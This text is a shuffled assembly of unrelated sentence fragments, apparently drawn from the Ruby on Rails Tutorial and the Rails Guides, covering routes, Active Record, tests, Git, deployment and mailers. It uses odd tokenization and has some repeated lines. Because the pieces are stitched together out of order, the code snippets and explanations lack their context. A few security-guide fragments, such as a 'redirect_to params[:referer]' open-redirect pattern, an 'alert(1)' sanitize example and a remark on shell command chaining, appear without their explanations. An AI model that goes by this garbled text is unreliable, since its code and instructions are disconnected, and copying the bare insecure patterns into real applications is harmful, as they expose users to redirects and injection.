Notice here that we \ kode { render } a partial called \ kode { &apos; shared / error \ _ messages &apos; } ; this reflects the common Rails convention of using a dedicated \ kode { shared / } directory for partials expected to be used in views across multiple controllers .
# # # # url _ field
* `config / application ▖ rb`
As with plural resources , the same helpers ending in ` _ url` will also include the host , port and path prefix .
where we need to fill in the comment with the appropriate code .
NOTE : You can use subfolders to organize your initializers if you like , because Rails will look into the whole file hierarchy from the initializers folder on down .
Following the model of passwords ( Listing ~ \ ref { code : find _ authenticate _ user } ) and remember tokens ( Listing ~ \ ref { code : persistent _ current _ user } ) , we plan to find and authenticate the user with code something like this :
$ rails generate
now = DateTime ▖ current
get &apos; : controller / : action / : id / with _ user / : user _ id&apos;
def expiration _ date _ cannot _ be _ in _ the _ past
Putting these elements together yields the test in Listing ~ \ ref { code : micropost _ validity _ test } .
The main purpose of our test is to verify that clicking the signup button results in \ emph { not } creating a new user when the submitted information is invalid .
First , there &apos;s \ kode { first } :
&lt; h1 &gt; Listing Articles &lt; / h1 &gt;
To write tests for the delete functionality , it &apos;s helpful to be able to have a factory to create admins .
Ruby on Rails ╼ Tutorial
Regardless of which database system you &apos;re using , the Active Record method format will always be the same .
Because web applications have so many moving parts , they offer ample opportunities to develop your technical sophistication .
Note here , ╼ however , that the migration is called `create _ blorgh _ articles` rather than the ╼ usual `create _ articles` ▖
You may recall from Section ~ \ ref { sec : a _ class _ of _ our _ own } that Ruby lets you add methods to \ emph { any } class , even built-in ones .
We use the complementary method \ kode { after ( : all ) } to delete the users once we &apos;re done .
By putting together everything we &apos;ve learned in this book , we &apos;ve successfully implemented user following with a status feed of microposts from followed users .
Of course , this simplicity is a sign of being \ emph { more } advanced , not less---we &apos;ve come a long way since our reliance on scaffolding in Chapter ~ \ ref { cha : a _ toy _ app } , and we no longer need most of its complexity .
The result appears in Listing ~ \ ref { code : destroy _ session }
method .
( If you find this note confusing , it is safe to ignore it ▖ )
belongs _ to : account
( Such configuration settings can be fiddly and error-prone , so I mainly recommend them for more advanced users ; Sublime Text is an excellent choice for editing Rails applications even without the advanced setup ▖ )
Action Mailer Basics
\ label { fig : user _ index _ mockup } } ╼ \ end { figure } ╼ ╼ ╼ \ subsection { Users index } % ( fold ) ╼ \ label { sec : users _ index } ╼ ╼
By the way , you can see a list of your commit messages using the \ kode { log } command :
X-Served-By : cache-dfw1828-DFW
Will generate this HTML output :
The argument of \ texttt { let } is a symbol , and it takes a block whose return value is assigned to a local variable with the symbol &apos;s name .
store
Adding the SSH public key .
Finished in 0 ▖ 01999 seconds
This means that , no matter where you currently are in your knowledge of web development , by the time you finish this tutorial you will be ready for more advanced Rails resources , as well as for the more systematic treatments of the other subjects mentioned .
Converting the \ kode { Gemfile } in Listing ~ \ ref { code : default _ gemfile } to use exact gem versions results in the code shown in Listing ~ \ ref { code : gemfile _ sqlite _ version } .
The examples above show that `in _ groups` fills some groups with a trailing `nil` element as needed ▖
Symbols look kind of like strings , but prefixed with a colon instead of surrounded by quotes .
Here the \ kode { following \ _ ids } method is synthesized by Active Record based on the \ kode { has \ _ many : following } association ( Listing ~ \ ref { code : has _ many _ following _ through _ active _ relationships } ) ; the result is that we need only append \ kode { \ _ ids } to the association name to get the ids corresponding to the \ kode { user ▖ following } collection .
Section ~ \ ref { sec : the _ relationship _ model } placed rather heavy demands on our data modeling skills , and it &apos;s fine if it takes a while to soak in .
mail _ in _ production ( end ) ╼ ╼ % section password _ reset ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : resets _ conclusion } ╼ ╼
Navigate to &lt; http : / / localhost : 3000 / articles / new &gt; and you &apos;ll see a routing ╼ error :
The \ emph { Ruby on Rails Tutorial } takes an integrated approach to web development by building three example applications of increasing sophistication , starting with a minimal \ emph { hello } app ( Section ~ \ ref { sec : the _ hello _ application } ) , a slightly more capable \ emph { toy } app ( Chapter ~ \ ref { cha : a _ toy _ app } ) , and a real \ emph { sample } app ( Chapter ~ \ ref { cha : static _ pages } through Chapter ~ \ ref { cha : following _ users } ) .
* `asset-path ( &quot; rails ▖ png &quot; ) ` becomes ` &quot; / assets / rails ▖ png &quot; `
# # # # Finding Layouts
╼ / ▖ bundle ╼ ╼ # Ignore the default SQLite database .
Math ▖ cos ( 0 ) ▖ to _ i ▖ object _ id # = &gt; 3
Though good for getting a general overview of Rails , the scaffold Users resource suffers from a number of severe weaknesses .
Our method is to iterate through the \ kode { flash } and insert all relevant messages into the site layout .
Engine model and controller classes can be extended by open classing them in the ╼ main Rails application ( since model and controller classes are just Ruby classes ╼ that inherit Rails specific functionality ) ▖
Because a User object is true in a boolean context , the call to \ kode { find \ _ by } only gets executed if \ kode { @ current \ _ user } hasn &apos;t yet been assigned .
In other words , this query can be generated by calling `where` with no argument , then immediately chain with `not` passing `where` conditions .
as seen in Listing ~ \ ref { code : microposts _ resource } .
It is important to note that Git commits are \ emph { local } , recorded only on the machine on which the commits occur .
# # # # Named Datetimes
Start comments in upper case ▖
╼ ╼ \ subsection { Guide to further resources } % ( fold ) ╼ \ label { sec : guide _ to _ further _ resources } ╼ ╼
This will produce :
( At this point , I also recommend removing the \ kode { hello } action from the Application controller if you added it in Section ~ \ ref { sec : sample _ app _ setup } ▖ )
We &apos;ll accomplish this using the \ kode { where } method on the \ kode { Micropost } model ( seen briefly before in Section ~ \ ref { sec : exercises _ activation _ test _ and _ refactoring } ) , as shown in Listing ~ \ ref { code : proto _ status _ feed }
* How to test your Action Mailer classes .
NOTE : Defined in `active _ support / core _ ext / array / prepend _ and _ append ▖ rb` .
anything
╼ other _ user = users ( : malory ) ╼ log _ in _ as ( other _ user ) ╼ get root _ path ╼ assert _ match &quot; 0 microposts &quot; , response ▖ body ╼ other _ user ▖ microposts ▖ create ! ( content : &quot; A micropost &quot; ) ╼ get root _ path ╼ assert _ match FILL _ IN , response ▖ body ╼ end ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection micropost _ tests ( end ) ╼ ╼ % section manipulating _ microposts ( end ) ╼ ╼ ╼ \ section { Micropost images } % ( fold ) ╼ \ label { sec : micropost _ images } ╼ ╼
To avoid code repetition , you should also remove \ kode { logged \ _ in \ _ user } from the Users controller at this time .
The \ kode { log \ _ out } method .
The debug information above shows that submitting the form results in a \ kode { user } hash with attributes corresponding to the submitted values , where the keys come from the \ kode { name } attributes of the \ kode { input } tags seen in Listing ~ \ ref { code : signup _ form } ; for example , the value of
▖ secret
A test for persistent sessions .
validates : name , : login , : email , presence : true
The awesome \ href { http : / / www ▖ rubular ▖ com / } { Rubular } regular expression editor ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / rubular-full ▖ png } { ( full size ) }
On the other hand , `advance` and `change` are also defined and support more options , they are documented below .
( The error message is a hint that Rails validates the presence of an attribute using the \ kode { blank ? }
Also note that in this case the word ``followers &apos; &apos; is acting as a \ emph { label } , so we keep it plural even when there is only one follower .
create test / models / user _ test ▖ rb
Prefer ` { a : : b } ` over ` { : a = &gt; : b } ` .
The CHANGELOG is an important part of every release ▖
While convenient for the programmer , this is inefficient in production ; including multiple full-sized files can significantly slow page-load times ( one of the most important factors affecting the quality of the user experience ) .
micropost ▖ user
Verify that a profile link appears .
Finally , you &apos;ll note that the follow form doesn &apos;t have any content other than the button , but it still needs to send the \ kode { followed \ _ id } to the controller .
( This is just a first implementation ; we &apos;ll discuss this subject again in Section ~ \ ref { sec : account _ activations _ resource } , where we &apos;ll use the preferred \ emph { method reference } convention for defining callbacks ▖ )
Active Job has built-in adapters for multiple queueing backends ( Sidekiq , ╼ Resque , Delayed Job and others ) ▖
&lt; % = render &quot; shared / footer &quot; % &gt;
We also test that the error message contains the text \ kode { &quot; Invalid &quot; } .
`pluck` makes it possible to replace code like :
Here is a list of common headers :
╼ ╼ % subsection the _ first _ signup ( end ) ╼ ╼ \ subsection { A test for valid submission } % ( fold ) ╼ \ label { sec : a _ test _ for _ valid _ submission } ╼ ╼
The first looks like this :
The users index page with only one user .
Even then , Windows users should be warned that the Rails installer recommended by InstallRails is often out of date , and is likely to be incompatible with the present tutorial .
use Rails : : Rack : : Logger
Adding a root route for users .
The preprocessor engines can be chained , so that
The resulting routes file is shown in Figure ~ \ ref { fig : home _ root _ route } .
You can also deploy the application and even populate the production database with sample users ( using the \ kode { pg : reset } task to reset the production database ) :
extend ActiveSupport : : Concern
Such highlighted lines typically indicate the most important new code in the given sample , and often ( though not always ) represent the difference between the present code listing and previous listings .
# the object was duplicated , so the element was added only to the duplicate
As seen in Figure ~ \ ref { fig : filled _ in _ form } , text and email fields ( \ kode { type = &quot; text &quot; } and \ linebreak \ kode { type = &quot; email &quot; } ) simply display their contents , whereas password fields \ linebreak ( \ kode { type = &quot; password &quot; } ) obscure the input for security purposes , as seen in Figure ~ \ ref { fig : filled _ in _ form } .
The image uploader developed in Section ~ \ ref { sec : image _ resizing } is good enough for development , but ( as seen in the \ kode { storage : file } line in Listing ~ \ ref { code : image _ uploader _ resizing } ) it uses the local filesystem for storing the images , which isn &apos;t a good practice in production
Requiring a signed-in user for the \ kode { index } action .
attr _ name = attribute ▖ to _ s ▖ tr ( &apos; ▖ &apos; , &apos; _ &apos; ) ▖ humanize
Some more uses of \ kode { assert \ _ select } appear in Table ~ \ ref { table : assert _ select } .
# # # Generating Paths and URLs from Code
number ▖ object _ id = = duplicate ▖ object _ id # = &gt; true
3 ▖ megabytes # = &gt; 3145728
p = Product ▖ new
You are free to leave your existing `secret _ token` in place , not set the new `secret _ key _ base` , and ignore the deprecation warnings until you are reasonably sure that your upgrade is otherwise complete .
The \ kode { nav } tag , though formally unnecessary here , communicates the purpose of the navigation links .
You can help improve the Rails guides by making them more coherent , consistent or readable , adding missing information , correcting factual errors , fixing typos , or bringing it up to date with the latest edge Rails ▖ ╼ ╼
ensures that only email addresses that match the pattern will be considered valid .
sample application .
To learn more about RubyGems , please read the &#91; RubyGems Guides &#93; ( http : / / guides ▖ rubygems ▖ org ) .
This code , which isn &apos;t displayed in the browser , is used internally by Rails , so it &apos;s not important for us to understand what it does .
This method is created automatically by CarrierWave based on the name of the image attribute .
Now that the follow buttons are working , we &apos;ll write some simple tests to prevent regressions .
&lt; % content _ for : special _ script do % &gt;
In addition to this bracket notation , Ruby offers synonyms for some commonly accessed elements
As you can see , our validation lets us know that our `Person` is not valid ╼ without a `name` attribute ▖
invoke helper
Grounded in examples from Chapter ~ \ ref { cha : static _ pages } , this chapter explores some elements of the Ruby programming language that are important for Rails .
Note how convenient the use of Factory Girl is : we can set \ kode { created \ _ at } manually , which Active Record won &apos;t allow us to do .
Provided that the pipeline is enabled within your application ( and not disabled ╼ in the current environment context ) , this file is served by Sprockets ▖
class TrashableCleanupJob
# If you find yourself ignoring temporary files generated by your text editor
The above code will execute just * * 2 * * queries , as opposed to * * 11 * * queries in the previous case :
Assets Cache Store
You can render text , JSON , or XML ▖
For locales , simply place the locale files in the `config / locales` directory , ╼ just like you would in an application .
login _ path
If the time to be constructed lies beyond the range supported by `Time` in the runtime platform , usecs are discarded and a `DateTime` object is returned instead .
The `update` action is still used , ╼ and `PUT` requests will continue to be routed to the `update` action as well .
Time ▖ local ( 2000 , 7 , 31 ) ▖ prev _ quarter # = &gt; Sun , 30 Apr 2000
TIP : Ruby 1 ▖ 8 ▖ 7 p248 and p249 have marshaling bugs that crash Rails ▖
# the future default .
&lt; strong &gt; Commenter : &lt; / strong &gt;
# # # # distance _ of _ time _ in _ words
&#124; tmp / &#124; Temporary files ( like cache , pid , and session files ) .
&lt; th colspan = &quot; 2 &quot; &gt; &lt; / th &gt;
For example , let &apos;s say the GitHub user JohnSmith has forked and pushed to a topic branch &quot; orange &quot; located at https : / / github ▖ com / JohnSmith / rails .
@ article ▖ save
In the \ emph { Rails Tutorial } , we &apos;ll follow the common convention of using the \ kode { \ _ path } form except when doing redirects , where we &apos;ll use the \ kode { \ _ url } form .
delete user with id \ kode { 1 }
* `proxy _ association ▖ owner` returns the object that the association is a part of .
Previous versions of Rails used a method called \ kode { attr \ _ accessible } in the \ emph { model } layer to solve this problem , and you may still see that method in legacy Rails applications , but as of Rails ~ 4 ▖ 0 the preferred technique is to use so-called \ emph { strong parameters } in the controller layer .
# = &gt; true
Finally ,
&#124; * * Server Error * * &#124; 500 &#124; : internal _ server _ error &#124;
# active _ model / serializers / xml ▖ rb
I only mention this point because it can be seriously confusing if you try to set your editor to \ kode { subl } or \ kode { gvim } without the flag .
The Static Pages controller with added \ kode { about } action ▖
Notice that inside the `create` action we use `render` instead of `redirect _ to` ╼ when `save` returns `false` ▖
Adding a digest method for use in fixtures .
if discount &gt; total _ value
The view for the user index .
sanitize @ article ▖ body
A user profile with an unfollow button ( \ href { http : / / localhost : 3000 / users / 5 } { / users / 5 } ) .
This is a good example why blacklist filters are never complete and why it is hard to allow HTML / JavaScript in a web application .
The image uploader developed in Section ~ \ ref { sec : image _ resizing } is good enough for development , but ( as seen in the \ kode { storage : file } line in Listing ~ \ ref { code : image _ uploader _ resizing } ) it uses the local filesystem for storing the images , which isn &apos;t a good practice in production
delegate : table _ name , to : : class
module Blorgh
As you can see in the previous example if a key is found in both hashes the value in the one in the argument wins .
/ db / * ▖ sqlite3-journal
The words \ emph { shim } and \ emph { shiv } are used interchangably in this context ; the former is the proper term , based on the English word whose meaning is ``a washer or thin strip of material used to align parts , make them fit , or reduce wear &apos; &apos; , while the latter ( meaning ``a knife or razor used as a weapon &apos; &apos; ) is apparently a play on the name of the shim &apos;s original author , Sjoerd Visscher .
success
SELECT viewable _ by , locked FROM clients
# = = = = Examples
Closely related to arrays are \ emph { ranges } , which can probably most easily be understood by converting them to arrays using the \ kode { to \ _ a } method :
Get your test to pass by following the same steps as when making the About page in Section ~ \ ref { sec : green } , including filling the Contact page with the content from Listing ~ \ ref { code : proposed _ contact _ page } .
# &lt; / textarea &gt;
This automatically ensures that we find only microposts belonging to the current user .
* &#91; Ruby on Rack # 2 - The Builder &#93; ( http : / / m ▖ onkey ▖ org / ruby-on-rack-2-the-builder )
&lt; form accept-charset = &quot; UTF-8 &quot; action = &quot; / articles &quot; data-remote = &quot; true &quot; method = &quot; post &quot; &gt;
In Ruby , the MD5 hashing algorithm is implemented using the \ kode { hexdigest } method , which is part of the \ kode { Digest } library :
The `params` will also include any parameters from the query string ▖
# loaded and you are going to fetch the records anyway it is better to
When interpolated into a string , the ` : to` option should become an expression that evaluates to the object the method is delegated to ▖
The method is to require each user to have a password ( with a password confirmation ) , and then store an encrypted version of the password in the database .
$ ( document ) ▖ ready - &gt;
# # # # # Additional Column Methods
GitHub and Bitbucket
force config / application ▖ rb
-------------------------------------
Note in particular the dramatic improvement in the rules for the \ kode { footer } tag .
While if it did it the other way around the result would be different :
This tutorial standardizes on Rails ~ 4 ▖ 0 , which we can install as follows :
validates : name , presence : true
The \ kode { redirect \ _ back \ _ or } method uses the or operator ~ \ kode { &#124; &#124; } through
xml ▖ em { xml ▖ b ( &quot; emph &amp; bold &quot; ) }
As before , the \ kode { container } class has special meaning to Bootstrap .
Returns a collection of the user &apos;s microposts
# # # # Creating Join Tables for `has _ and _ belongs _ to _ many` Associations
In some applications , this initial implementation might be good enough for most practical purposes , but Listing ~ \ ref { code : initial _ working _ feed } isn &apos;t the final implementation ; see if you can make a guess about why not before moving on to the next section .
te } ╼ ╼ % subsection creating _ and _ authenticating _ a _ user ( end ) ╼ ╼ % section adding _ a _ secure _ password ( end ) ╼ ╼ \ section { Conclusion } ╼ \ label { sec : modeling _ users _ conclusion } ╼ ╼
Then commit the other changes to the main source code repository :
WARNING ▖ If the argument is an `IO` it needs to respond to `rewind` to be able to retry ▖
as shown in Listing ~ \ ref { code : signed _ in _ p } .
INFO : The following calculation methods have edge cases in October 1582 , since days 5 ▖ ▖ 14 just do not exist ▖
SELECT * FROM articles WHERE id &gt; 10 ORDER BY id asc LIMIT 20
class ArticlesController &lt; ApplicationController
For example , in an application containing customers and orders , the customer model could be declared like this :
The above session produces the following SQL for a MySQL backend :
&apos;X-Content-Type-Options &apos; = &gt; &apos; nosniff&apos;
Adding a \ kode { remember } method to the User model ▖
`config ▖ action _ controller` includes a number of configuration settings :
Adding an options hash in the \ kode { gravatar \ _ for } helper .
redirect _ to params &#91; : referer &#93;
Active Job provides hooks during the lifecycle of a job ▖
One common scenario is wanting to undo code generation---for example , if you change your mind on the name of a controller .
&lt; % = content _ for ? ( : news _ content ) ?
The results for invalid and valid submissions are shown in Figure ~ \ ref { fig : password _ reset _ failure } and Figure ~ \ ref { fig : password _ reset _ success } , respectively .
This situation can be modeled with self-joining associations :
Finally , we &apos;ll add the ability to destroy users , wiping them clear from the database .
You can use `insert _ before` if you wish to add a middleware before another .
Putting your source code under version control with Git is \ emph { strongly } recommended , not only because it &apos;s nearly a universal practice in the Rails world , but also because it will allow you to back up and share your code more easily ( Section ~ \ ref { sec : bitbucket } ) and deploy your application right here in the first chapter ( Section ~ \ ref { sec : deploying } ) .
To understand a database index , it &apos;s helpful to consider the analogy of a book index .
Everyone from scrappy startups to huge companies have used Rails : \ href { http : / / 37signals ▖ com / } { 37signals } , \ href { http : / / github ▖ com / } { GitHub } , \ href { http : / / shopify ▖ com / } { Shopify } , \ href { http : / / scribd ▖ com / } { Scribd } , \ href { http : / / twitter ▖ com / } { Twitter } , \ href { http : / / disney ▖ com / } { Disney } , \ href { http : / / hulu ▖ com / } { Hulu } , the \ href { http : / / yellowpages ▖ com / } { Yellow Pages } ---the \ href { http : / / rubyonrails ▖ org / applications } { list of sites using Rails } goes on and on .
For example , in this chapter we &apos;ll update the site header with signin / signout links and a profile link .
This is because each time RSpec runs the tests it has to reload the entire Rails environment .
# # # `truncate _ words`
The final part of this message tells us where Rails has looked for the templates ▖ ╼
attachments ▖ inline &#91; &apos; image ▖ jpg &apos; &#93; = File ▖ read ( &apos; / path / to / image ▖ jpg &apos; )
def show
You can override the default layout conventions in your controllers by using the `layout` declaration ▖
DELETE
╼ ╼ \ section { Planning the application } % ( fold ) ╼ \ label { sec : planning _ the _ application } ╼ ╼
The result is shown in Listing ~ \ ref { code : generate _ users _ controller } .
WARNING : If you are upgrading an existing application and intend to use this ╼ option , take care to paste this configuration option only into `production ▖ rb` ╼ and any other environments you define with production behavior ( not ╼ `application ▖ rb` ) .
This is easy using the named route \ kode { edit \ _ user \ _ path } from Table ~ \ ref { table : RESTful _ users } , together with the handy \ kode { current \ _ user } helper method defined in Listing ~ \ ref { code : persistent _ current _ user } :
Then navigate to \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ( Figure ~ \ ref { fig : raw _ home _ view } ) .
I &apos;d like to thank Aure both for the work he did on that book and for his support of this one .
Create a new ╼ directory at `app / views / blorgh / comments` and in it a new file called ╼ ` _ form ▖ html ▖ erb` which has this content to create the required partial :
As part of implementing these associations , we &apos;ll write tests for the Micropost model and add a couple of tests to the User model .
The `max-age` ╼ value is set to seconds with a maximum possible value of `31536000` which is one ╼ year ▖
NOTE : The `ApplicationController` class inside an engine is named just like a ╼ Rails application in order to make it easier for you to convert your ╼ applications into engines .
See \ href { http : / / stackoverflow ▖ com / questions / 941594 / understand-rails-authenticity-token } { the Stack Overflow entry on the Rails authenticity token } if you &apos;re interested in the details of how this works and why it &apos;s important ▖ )
If an incoming request of ` / photos / show / 1` is processed by this route ( because it hasn &apos;t matched any previous route in the file ) , then the result will be to invoke the `show` action of the `PhotosController` , and to make the final parameter ` &quot; 1 &quot; ` available as `params &#91; : id &#93; ` ▖
One final detail worth noting is the presence of CSS ids on some elements , as in
@ customer ▖ orders ▖ delete ( @ order1 )
If you want to share your progress at this point , feel free to send a tweet or Facebook status update with something like this :
The API is careful not to commit to any particular value , the method has ╼ predicate semantics , that &apos;s enough .
* `action _ mailer ▖ compile _ config _ methods` Initializes methods for the config settings specified so that they are quicker to access .
The engine will then associate the article with the found or ╼ created `User` object .
Note how closely this resembles the new user view from Listing ~ \ ref { code : signup _ form } ; the large overlap suggests factoring the repeated code into a partial , which is left as an exercise ( Section ~ \ ref { sec : exercises _ edit _ form } ) .
While in a small application , this added latency might not be a problem , it is something to think about if response time is a concern ▖
This is useful in scenarios where you need a chainable response to a method or a scope that could return zero results .
has _ and _ belongs _ to _ many : assemblies , - &gt; { where active : true }
# = &gt; &quot; alert ( 1 ) &quot;
but that isn &apos;t the Rails Way ™ .
INFO : The three of them return `nil` for blank receivers .
# self ▖ include _ root _ in _ json = false
creates six different routes in your application , all mapping to the `Geocoders` controller :
The next two lines should also look familiar ; the scenario steps
So far , we &apos;ve seen three examples of how to define a root route , starting with the code
Please read &#91; Pull Request # 9978 &#93; ( https : / / github ▖ com / rails / rails / pull / 9978 ) for details on the move to encrypted session cookies .
This declaration constrains the ` : id` parameter to match the supplied regular expression ▖
# instead of true .
select _ date ( )
TIP : You don &apos;t need to pass all attributes to `update` ▖
Active Record Validations
# Set to ` : info` to match the current default , or set to ` : debug` to opt-into
The user edit page ( \ href { http : / / localhost : 3000 / users / 1 / edit } { / users / 1 / edit } ) .
By running the test suite , verify that the \ kode { before \ _ save } callback can be written using the ``bang &apos; &apos; method \ kode { email ▖ downcase ! } \ to modify the \ kode { email } attribute directly , as shown in Listing ~ \ ref { code : downcase _ bang } .
NOTE : Because the `has _ many` is defined inside a class that is inside the ╼ `Blorgh` module , Rails will know that you want to use the `Blorgh : : Comment` ╼ model for these objects , so there &apos;s no need to specify that using the ╼ ` : class _ name` option here .
Rails 4 ▖ 1 will map `json` and `hstore` columns to a string-keyed Ruby `Hash` .
&lt; % = image _ tag attachments &#91; &apos; image ▖ jpg &apos; &#93; ▖ url % &gt;
To see all the Rake tasks available , run
The \ emph { reason } I chose to break the code into pieces is that I prefer to keep lines of source code under 80 characters for legibility
POST / users ( ▖ : format ) users # create
Because we also included the attribute ( \ kode { remember \ _ digest } ) and type ( \ kode { string } ) , Rails generates a default migration for us , as shown in Listing ~ \ ref { code : add _ remember _ digest _ to _ users _ generated } .
If you get stuck , don &apos;t hesitate to skip it ; as noted previously , the sample application developed in this tutorial is fully compatible with both SQLite and PostgreSQL .
The \ kode { create ! } \ method is just like the \ kode { create } method , except it raises an exception ( Section ~ \ ref { sec : finding _ user _ objects } ) for an invalid user rather than returning \ kode { false } .
assoc ▖ has _ many : customers
You can see how a case could be made for either Cucumber or integration tests .
As we &apos;ll see in Chapter ~ \ ref { cha : sign _ up } , it &apos;s often convenient to make and save a model in two steps as we have above , but Active Record also lets you combine them into one step with \ kode { User ▖ create } :
The above are guidelines - please use your best judgment in using them .
unless : Proc ▖ new { &#124; c &#124; c ▖ trackpad ▖ present ?
This is because in most shells , you can execute another command at the end of the first one , concatenating them with a semicolon ( ; ) or a vertical bar ( &#124; ) .
# # # # New JSON encoder
The \ href { http : / / gravatar ▖ com / } { Gravatar } image-cropping interface , with a picture of \ href { http : / / www ▖ michaelhartl ▖ com / } { some dude } .
Formats a number with grouped thousands using a delimiter .
But , as noted in Section ~ \ ref { sec : a _ problem _ with _ the _ data _ model } , \ kode { user ▖ followeds } is rather awkward , so we &apos;ll write \ kode { user ▖ following } instead .
render template : &quot; books / edit ▖ html ▖ erb &quot;
Let &apos;s consider each in turn .
= &gt; &quot; foo &quot;
To make these collections , it &apos;s worth knowing about the useful \ kode { \ % w &#91; &#93; } technique for making arrays of strings , as seen in this console session :
* FROM clients LEFT OUTER JOIN addresses ON addresses ▖ client _ id = clients ▖ id
&lt; % = link _ to &apos; Patient Record &apos; , patient _ path ( @ patient ) % &gt;
&lt; a href = &quot; ▖ ▖ ▖ &quot; data-no-turbolink &gt; No turbolinks here &lt; / a &gt; .
A direct test the \ kode { full \ _ title } helper .
In future chapters , the branches and commit messages will differ , of course , but the basic idea is the same .
The user index page ( \ href { http : / / localhost : 3000 / users } { / users } ) with a second user ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ user _ index _ two _ rails _ 3-full ▖ png } { ( full size ) }
Tips , Tricks , and Warnings
validates : mouse , presence : true ,
( This is the security hole alluded to above ▖ )
As you can see , Rails provides a \ texttt { Rails } object with an \ texttt { env } attribute and associated environment boolean methods , so that , for example , \ texttt { Rails ▖ env ▖ test ? } returns \ texttt { true } in a test environment and \ texttt { false } otherwise .
Array ▖ wrap ( 0 ) # = &gt; &#91; 0 &#93;
Assuming ` @ products` is a collection of `product` instances , you can simply write this in the `index ▖ html ▖ erb` to produce the same result :
If this test feels a little abstract , go ahead and fire up the console :
$ bundle exec rails new ~ / my-test-app --dev
Converting these requirements to assertions and recalling that the \ kode { feed } is in the User model ( Listing ~ \ ref { code : proto _ status _ feed } ) gives the updated User model test shown in Listing ~ \ ref { code : full _ feed _ test } .
* How to declare associations between Active Record models .
* ` : delete` , when the object is destroyed , all its associated objects will be ╼ deleted directly from the database without calling their `destroy` method .
# # # # Rendering Nothing
Rails will automatically generate a response with the correct HTTP status code ( in most cases , this is `200 OK` ) ▖
The default \ kode { Gemfile } open in a text editor .
class User
Comparing Listing ~ \ ref { code : demo _ users _ controller _ class } and Listing ~ \ ref { code : demo _ microposts _ controller _ class } , we see that both the Users controller and the Microposts controller inherit from the Application controller .
( You &apos;ve probably visited websites where ``small &apos; &apos; images seemingly take forever to load .
Like an `image _ tag` you can supply a path , either absolute , or relative to the `public / videos` directory ▖
There are a couple of new configuration settings that you should add to your development environment :
For example , consider a hash named \ kode { flash } with keys for two conditions , \ kode { : success } and \ kode { : error } :
has _ one : account , class _ name : &quot; Billing &quot;
( For technical reasons , the only exception to this is the \ kode { rails } command itself ▖ )
$ ( &quot; # results &quot; ) ▖ append html
Testing an engine
Migration filenames include a timestamp to ╼ ensure that they &apos;re processed in the order that they were created .
Among other things , file storage on Heroku is temporary , so uploaded images will be deleted every time you deploy .
This is exactly the same as defining a class method , and which you use is a matter of personal preference :
* `update`
This means that there &apos;s only one constraint left : enforcing the email addresses to be unique .
Adding a resource for account activations .
This should fail because by default the posts will be ordered by ~ id , i ▖ e ▖ , \ kode { &#91; older \ _ micropost , newer \ _ micropost &#93; } .
In this case , a non-signed-in user is redirected upon submitting a \ texttt { POST } request to / microposts ( \ kode { post microposts \ _ path } , which hits the \ kode { create } action ) or submitting a \ texttt { DELETE } request to / microposts / 1 ( \ kode { delete micropost \ _ path ( micropost ) } , which hits the \ kode { destroy } action ) .
In the next chapter , Chapter ~ \ ref { cha : sign _ up } , we &apos;ll make a working signup form to create new users , together with a page to display each user &apos;s information .
The \ kode { heroku } command creates a new subdomain just for our application , available for immediate viewing .
You can verify that you have a sufficiently up-to-date version of RVM as follows :
We will see starting in Chapter ~ \ ref { cha : sign _ up } that initializing objects using a hash argument , a technique known as \ emph { mass assignment } , is common in Rails applications .
is \ kode { &apos; 1&apos; } if the box is checked and \ kode { &apos; 0&apos; } if it isn &apos;t .
Partials are very useful in rendering collections ▖
options = options ▖ reverse _ merge ( length : 30 , omission : &quot; ▖ ▖ ▖ &quot; )
Among other things , the techniques here may be more up-to-date than the ones you picked up when you originally learned Rails .
If you &apos;re using Git , now would be a good time to commit if you haven &apos;t done so in a while :
By construction , the Users controller already has a \ kode { new } action , so to get the test to pass all we need is the right route and the right view content .
See the discussion on \ href { http : / / stackoverflow ▖ com / questions / 5359558 / when-to-use-rspec-let } { when to use let at Stack Overflow } for more information .
This will also create routing helpers such as `magazine _ ads _ url` and `edit _ magazine _ ad _ path` ▖
The asset pipeline is technically no longer a core feature of Rails 4 , it has ╼ been extracted out of the framework into the ╼ &#91; sprockets-rails &#93; ( https : / / github ▖ com / rails / sprockets-rails ) gem .
create _ table : parts do &#124; t &#124;
If the module is anonymous or belongs to the top-level , `parent` returns `Object` .
With the user view and action defined , the URL \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { / users / 1 } works perfectly , as seen in Figure ~ \ ref { fig : user _ show _ rails } .
in Listing ~ \ ref { code : user _ factory } .
The corresponding application code is virtually identical to the \ kode { name } validation for users ( Listing ~ \ ref { code : length _ validation } ) , as shown in Listing ~ \ ref { code : micropost _ validations } .
Note that we also add \ kode { : destroy } to the \ kode { signed \ _ in \ _ user } before filter .
class AccountHistory &lt; ActiveRecord : : Base
* `select`
&#124; `Rails : : Rack : : Debugger` &#124; Starts Debugger &#124;
No route matches &#91; GET &#93; &quot; / static _ pages / about &quot;
The tests themselves rely on the \ emph { boolean convention } used by RSpec : the code
Verify that the new sessions form gets re-rendered and that a flash message appears .
&lt; % = link _ to &apos; Magazine details &apos; , @ magazine % &gt;
&lt; % = render partial : &quot; product &quot; , collection : @ products , layout : &quot; special _ layout &quot; % &gt;
Sent mail to michael @ michaelhartl ▖ com ( 931 ▖ 6ms ) ╼ Date : Wed , 03 Sep 2014 19 : 47 : 18 + 0000 ╼ From : noreply @ example ▖ com ╼ To : michael @ michaelhartl ▖ com ╼ Message-ID : &lt; 540770474e16 _ 61d3fd1914f4cd0300a0 @ mhartl-rails-tutorial-953753 ▖ mail &gt; ╼ Subject : Account activation ╼ Mime-Version : 1 ▖ 0 ╼ Content-Type : multipart / alternative ; ╼ boundary = &quot; -- = = _ mimepart _ 5407704656b50 _ 61d3fd1914f4cd02996a &quot; ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ ╼ ---- = = _ mimepart _ 5407704656b50 _ 61d3fd1914f4cd02996a ╼ Content-Type : text / plain ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ Hi Michael Hartl , ╼ ╼ Welcome to the Sample App !
If the default name of the join table , based on lexical ordering , is not what you want , you can use the ` : join _ table` option to override the default .
You can pass in the filename ( ` ▖ js` extension is optional ) of JavaScript files that exist in your `app / assets / javascripts` directory for inclusion into the current page or you can pass the full path relative to your document root .
